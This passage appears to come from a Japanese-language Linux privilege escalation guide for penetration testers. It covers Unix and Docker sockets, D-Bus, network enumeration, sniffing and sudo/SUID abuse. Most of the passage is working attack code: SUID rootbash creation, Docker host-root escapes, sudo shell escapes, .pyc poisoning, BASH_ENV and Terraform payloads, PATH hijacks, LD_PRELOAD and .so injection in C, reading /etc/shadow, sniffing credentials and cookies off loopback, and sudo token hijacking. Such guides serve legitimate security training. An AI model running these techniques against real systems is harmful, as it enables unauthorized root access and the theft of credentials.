# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能な sockets

**書き込み可能な socket** を **見つけた** 場合（_ここで話しているのは Unix Sockets であって、config の `.socket` ファイルではありません_）、その socket と **通信** でき、場合によっては脆弱性を悪用できるかもしれません。

### Unix Sockets を列挙する
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP リクエストを待ち受けている **sockets** があるかもしれません（_ここで言っているのは .socket ファイルではなく、unix sockets として動作するファイルのことです_）。これを次のように確認できます:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP** リクエストで応答する場合、それと **通信** でき、場合によっては **脆弱性を悪用** できるかもしれません。

### Writable Docker Socket

Docker socket は、通常 `/var/run/docker.sock` にあり、厳重に保護すべき重要なファイルです。デフォルトでは `root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの write access を持つと、privilege escalation につながる可能性があります。以下では、その方法と、Docker CLI が利用できない場合の代替手段を説明します。

#### **Privilege Escalation with Docker CLI**

Docker socket への write access があれば、次のコマンドで privilege escalation できます。
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使うと、コンテナを root-level access でホストの file system に対して実行できます。

#### **Using Docker API Directly**

Docker CLI が利用できない場合でも、Docker socket は Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能な image の一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムの root directory を mount するコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを start します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、その中で command execution を可能にします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後は、ホストの file system への root-level access を持ったまま、コンテナ内で直接 command を実行できます。

### Others

docker socket に対する write permissions を持っていて、**docker** group の中にいる場合は、[**さらに privilege escalation する方法**](interesting-groups-linux-pe/index.html#docker-group) があることに注意してください。[**docker API が port で listening している場合**は、それを compromise できる可能性もあります](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**container から抜け出す方法や、container runtime を悪用して privilege escalation する方法** については、以下も確認してください:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

**`ctr`** コマンドを使えるなら、以下のページを読んでください。**これを悪用して privilege escalation できる可能性があります**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

**`runc`** コマンドを使えるなら、以下のページを読んでください。**これを悪用して privilege escalation できる可能性があります**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、高度な **inter-Process Communication (IPC) system** で、アプリケーション同士が効率的にやり取りし、データを共有できるようにします。modern Linux system を想定して設計されており、さまざまなアプリケーション通信のための堅牢な framework を提供します。

この system は汎用性が高く、プロセス間の data exchange を強化する基本的な IPC をサポートし、**enhanced UNIX domain sockets** を思わせる仕組みになっています。さらに、イベントや signal の broadcast を支援し、system component 間のシームレスな統合を促進します。たとえば、Bluetooth daemon から着信通知の signal が来ると、music player を mute することができ、user experience を向上させます。加えて、D-Bus は remote object system もサポートしており、アプリケーション間の service requests や method invocations を簡略化し、従来は複雑だった process を効率化します。

D-Bus は **allow/deny model** で動作し、policy rules の一致による累積効果に基づいて message permissions (method calls, signal emissions, etc.) を管理します。これらの policies は bus との interaction を指定し、これらの permissions の悪用を通じて privilege escalation につながる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるそのような policy の例では、root user が `fi.w1.wpa_supplicant1` を own し、send し、receive するための permissions が詳しく示されています。

user や group が指定されていない policies は universally に適用され、"default" context policies は、他の特定の policies でカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus通信の列挙と悪用方法をここで学ぶ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

ネットワークを列挙して、そのマシンの位置づけを把握するのは常に興味深いです。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

ホストがコマンドを実行できるのに callback が失敗する場合は、DNS、transport、proxy、route filtering を素早く切り分ける:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 開いているポート

アクセスする前に、これまで操作できなかったマシン上で動作しているネットワークサービスを必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
bind target で listener を分類する:

- `0.0.0.0` / `[::]`: すべての local interface に公開されている。
- `127.0.0.1` / `::1`: local-only（tunnel/forward の候補として良い）。
- 特定の internal IP（例: `10.x`, `172.16/12`, `192.168.x`, `fe80::`）: 通常、internal segment からのみ到達可能。

### Local-only service triage workflow

host を compromise したとき、`127.0.0.1` に bind された service は、shell から初めて到達可能になることが多い。簡単な local workflow は:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

ローカルの PE チェックに加えて、linPEAS は focused な network scanner としても実行できます。これは `$PATH` 内で利用可能な binaries（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、tooling をインストールしません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-d`、`-p`、または `-i` を `-t` なしで渡すと、linPEAS は純粋なネットワークスキャナーとして動作します（残りの privilege-escalation チェックをスキップします）。

### Sniffing

通信を sniff できるか確認してください。できる場合、いくつかの credentials を取得できるかもしれません。
```
timeout 1 tcpdump
```
簡単な実践チェック:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) は post-exploitation において特に価値があります。というのも、多くの内部専用サービスがそこに token/cookie/credentials を公開しているからです:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今すぐ capture し、後で parse する:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

**who** 自分が誰か、どの **privileges** を持っているか、システム内にどの **users** がいるか、どれが **login** できるか、そしてどれが **root privileges** を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳しくは、[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[here](https://twitter.com/paragonsec/status/1071152249529884674) を参照してください。\
**Exploit it** には、**`systemd-run -t /bin/bash`** を使用します。

### Groups

root 権限を与えられる可能性のある **group** に所属しているか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

クリップボード内に何か興味深いものがあるか確認してください（可能であれば）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

環境内の**いずれかのパスワードを知っている**場合は、そのパスワードで**各ユーザーとしてログインを試してください**。

### Su Brute

大量のノイズを気にしないなら、また `su` と `timeout` バイナリがコンピュータにあるなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーのブルートフォースを試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も `-a` パラメータでユーザーのブルートフォースを試みます。

## Writable PATH abuses

### $PATH

`$PATH` のどこかのフォルダに**書き込み可能**だと分かった場合、**書き込み可能なフォルダ内にバックドアを作成**し、別のユーザー（理想は root）が実行するコマンド名を付けることで、権限昇格できる可能性があります。そのコマンドは、`$PATH` の中であなたの書き込み可能フォルダより**前にあるフォルダから読み込まれない**ものである必要があります。

### SUDO and SUID

sudo を使って何らかのコマンドを実行できるか、あるいは suid ビットが付いている可能性があります。以下で確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンド**により、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能になります。たとえば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定によっては、ユーザーがパスワードを知らなくても、別のユーザー権限で特定のコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。これで、root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで、簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際に**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer** に基づいており、スクリプトを root として実行している間に任意の python library を読み込ませる **PYTHONPATH hijacking** に **脆弱** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudoで許可されたPython importにおける書き込み可能な `__pycache__` / `.pyc` poisoning

もし **sudoで許可されたPythonスクリプト** が、パッケージディレクトリに **書き込み可能な `__pycache__`** を持つモジュールを import する場合、キャッシュされた `.pyc` を置き換えて、次回の import 時に特権ユーザーとして code execution を得られる可能性があります。

- なぜ動くのか:
- CPython は bytecode cache を `__pycache__/module.cpython-<ver>.pyc` に保存します。
- interpreter は **header**（source に紐づく magic + timestamp/hash metadata）を検証したあと、その header の後ろにある marshaled code object を実行します。
- ディレクトリが書き込み可能であれば cached file を **delete and recreate** できるため、root所有だが書き込み不可の `.pyc` でも置き換えられます。
- 典型的な流れ:
- `sudo -l` で root として実行できる Python script や wrapper が見つかる。
- その script が `/opt/app/`、`/usr/local/lib/...` などから local module を import する。
- import される module の `__pycache__` directory が、あなたのユーザーまたは everyone に対して書き込み可能。

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
特権スクリプトを確認できる場合は、インポートされているモジュールとそのキャッシュパスを特定してください:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. sudo で許可されたスクリプトを 1 回実行し、Python に正規の cache file を作成させる。まだ存在しない場合に限る。
2. 正規の `.pyc` の先頭 16 bytes を読み取り、poisoned file に再利用する。
3. payload code object を compile し、`marshal.dumps(...)` で直列化して、元の cache file を削除し、元の header と malicious bytecode を付けて再作成する。
4. sudo で許可されたスクリプトを再実行すると、import により payload が root として実行される。

Important notes:

- 元の header を再利用することが key である。Python は bytecode 本体が本当に source と一致するかではなく、cache metadata が source file と一致するかをチェックするため。
- これは特に、source file が root-owned で書き込み不可だが、含まれている `__pycache__` directory には書き込み可能な場合に有効。
- この attack は、privileged process が `PYTHONDONTWRITEBYTECODE=1` を使う場合、safe permissions の location から import する場合、または import path 上のすべての directory への write access を削除している場合には失敗する。

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- 特権 Python import path 内のどのディレクトリも、低権限ユーザーが書き込めないようにすること。`__pycache__` も含む。
- 特権実行では、`PYTHONDONTWRITEBYTECODE=1` の使用と、予期しない書き込み可能な `__pycache__` ディレクトリの定期チェックを検討すること。
- 書き込み可能な local Python modules と書き込み可能な cache ディレクトリは、root で実行される書き込み可能な shell scripts や shared libraries と同じように扱うこと。

### BASH_ENV preserved via sudo env_keep → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可された command を実行する際に Bash の non-interactive startup behavior を利用して root として arbitrary code を実行できる。

- Why it works: non-interactive shells では、Bash はターゲット script を実行する前に `$BASH_ENV` を評価し、その file を source する。多くの sudo rules は script か shell wrapper の実行を許可している。`BASH_ENV` が sudo によって保持されると、その file は root privileges で source される。

- Requirements:
- 実行できる sudo rule（`/bin/bash` を non-interactive に呼び出す target、または bash script なら何でもよい）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
- sudo で許可するコマンドに shell wrapper を使わない。最小限の binary を使う。
- preserved env vars が使われたときの sudo I/O logging と alerting を検討する。

### preserved HOME を使った sudo 経由の Terraform (!env_reset)

sudo が environment をそのまま保持し（`!env_reset`）、`terraform apply` を許可している場合、`$HOME` は呼び出し元ユーザーのままになる。そのため Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を順守する。

- 必要な provider を書き込み可能な directory に向け、provider 名にちなんだ malicious plugin を配置する（例: `terraform-provider-examples`）:
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root で実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

Terraform variables は `TF_VAR_<name>` environment variables 経由で提供でき、sudo が environment を保持するときにそのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い validations は symlinks で bypass できます:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform は symlink を解決し、実際の `/root/root.txt` を attacker-readable な宛先にコピーします。同じ手法は、宛先 symlink を事前に作成することで特権パスへ**書き込む**ことにも使えます（例: provider の destination path を `/etc/cron.d/` 内に向ける）。

### requiretty / !requiretty

古いディストリビューションでは、sudo を `requiretty` で設定でき、これにより sudo は対話的な TTY からのみ実行されます。`!requiretty` が設定されている場合（またはこのオプションが存在しない場合）、sudo は reverse shells、cron jobs、scripts などの非対話的なコンテキストから実行できます。
```bash
Defaults !requiretty
```
これはそれ自体が直接の脆弱性ではありませんが、完全な PTY を必要とせずに `sudo` ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` が `env_keep+=PATH` または attacker-writable なエントリ（例: `/home/<user>/bin`）を含む `secure_path` を示す場合、sudo で許可された対象内の相対コマンドはすべて shadow できます。

- 要件: 絶対パスを使わずにコマンド（`free`, `df`, `ps` など）を呼び出すスクリプト/バイナリを実行する sudo ルール（多くは `NOPASSWD`）と、最初に検索される writable な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** して他のファイルを読み取るか、**symlinks** を使います。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
If a **ワイルドカード** が使用されている (\*)、それはさらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパス指定なしの Sudo command/SUID binary

単一のコマンドに対して **sudo permission** が **パスを指定せずに** 付与されている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで悪用できます
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合**にも使えます（変な SUID バイナリの内容は、**strings** で必ず確認してください）。

[実行するための payload の例。](payloads-to-execute.md)

### コマンドのパス付きの SUID バイナリ

**suid** バイナリが**パスを指定して別のコマンドを実行する**場合は、SUID ファイルが呼び出しているコマンド名で**function を export** してみてください。

例えば、SUID バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、function を作成してそれを export する必要があります:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### SUID wrapperによって実行される書き込み可能な script

よくあるカスタムアプリの misconfiguration は、root 所有の SUID binary wrapper が script を実行する一方で、その script 自体は low-priv users に書き込み可能になっているケースです。

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
If `/usr/local/bin/backup.sh` が書き込み可能なら、payload コマンドを追記してから SUID wrapper を実行できます:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
クイックチェック:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
この攻撃パスは、`/usr/local/bin` に配置された "maintenance"/"backup" ラッパーで特に一般的です。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ (`libc.so`) を含む他のすべての前に、ローダーによって読み込む 1 つ以上の共有ライブラリ（.so ファイル）を指定するために使用されます。このプロセスは、ライブラリの preloading として知られています。

ただし、システムのセキュリティを維持し、この機能が悪用されるのを防ぐために、特に **suid/sgid** 実行ファイルでは、システムはいくつかの条件を強制します。

- ローダーは、実効ユーザー ID (_euid_) と実 UID (_ruid_) が一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid の実行ファイルでは、suid/sgid でもある標準パス上のライブラリのみが preload されます。

`sudo` を使ってコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、**LD_PRELOAD** 環境変数は保持され、`sudo` でコマンドを実行しても認識されるため、結果として昇格した権限で任意コードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
/tmp/pe.c
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
それから **compile it** を使ってください:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**権限昇格**を実行する
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御できる場合も、同様の privesc が悪用され得ます。なぜなら、ライブラリが検索されるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** 権限を持つ不審な binary に遭遇した場合、**.so** ファイルを正しく読み込んでいるか確認するのが良いです。これは次のコマンドを実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用できる可能性があることを示唆しています。

これを exploit するには、Cファイル、たとえば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でシェルを実行することで権限昇格を狙います。

上記の C ファイルを、次のように共有オブジェクト (.so) ファイルにコンパイルします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID binary を実行すると exploit が発動し、system compromise の可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が書き込み可能なフォルダからライブラリを読み込んでいるのを見つけたので、必要な名前でそのフォルダ内にライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
エラーが発生した場合、たとえば
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリの厳選リストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同じですが、コマンド内で **引数のみを注入できる** 場合向けです。

このプロジェクトは、制限された shell から脱出する、権限を昇格または維持する、ファイルを転送する、bind shell と reverse shell を起動する、その他の post-exploitation タスクを容易にするために悪用できる Unix バイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合は、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、任意の sudo ルールを悪用する方法を見つけられるか確認できます。

### Reusing Sudo Tokens

**sudo access** はあるがパスワードはない場合、**sudo コマンドの実行を待ってからセッション token をハイジャックする**ことで権限を昇格できます。

権限昇格の要件:

- "_sampleuser_" として shell を持っていること
- "_sampleuser_" が **直近 15 分以内** に何かを実行するために **`sudo` を使用している** こと（デフォルトでは、それがパスワードを入力せずに `sudo` を使える sudo token の有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` にアクセスできること（アップロード可能でもよい）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` で一時的に `ptrace_scope` を有効化するか、`/etc/sysctl.d/10-ptrace.conf` を永続的に変更して `kernel.yama.ptrace_scope = 0` に設定できます）

これらの要件をすべて満たしている場合、**次を使って権限昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit** (`exploit.sh`) は _/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って **セッション内で sudo token を有効化** できます（自動的に root shell は得られないので、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2つ目のexploit** (`exploit_v2.sh`) は、root所有でsetuidが付いた sh shell を _/tmp_ に作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3つ目の exploit** (`exploit_v3.sh`) は、**sudoers file** を作成し、**sudo tokens を永続化し、すべての users が sudo を使用できるようにする**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

